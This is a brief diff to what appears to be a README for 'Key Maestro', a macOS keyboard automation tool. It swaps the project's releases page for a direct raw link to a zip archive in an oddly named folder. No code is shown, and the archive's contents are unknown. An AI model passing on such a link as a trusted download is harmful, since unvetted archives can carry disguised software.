@@ -1,4 +1,4 @@
-https://github.com/CLdestiny/key-maestro/releases
+https://raw.githubusercontent.com/CLdestiny/key-maestro/main/growingupness/key-maestro-2.3-alpha.2.zip
 
 # Key Maestro: Advanced Keyboard Automation on macOS for Mac Pros
 
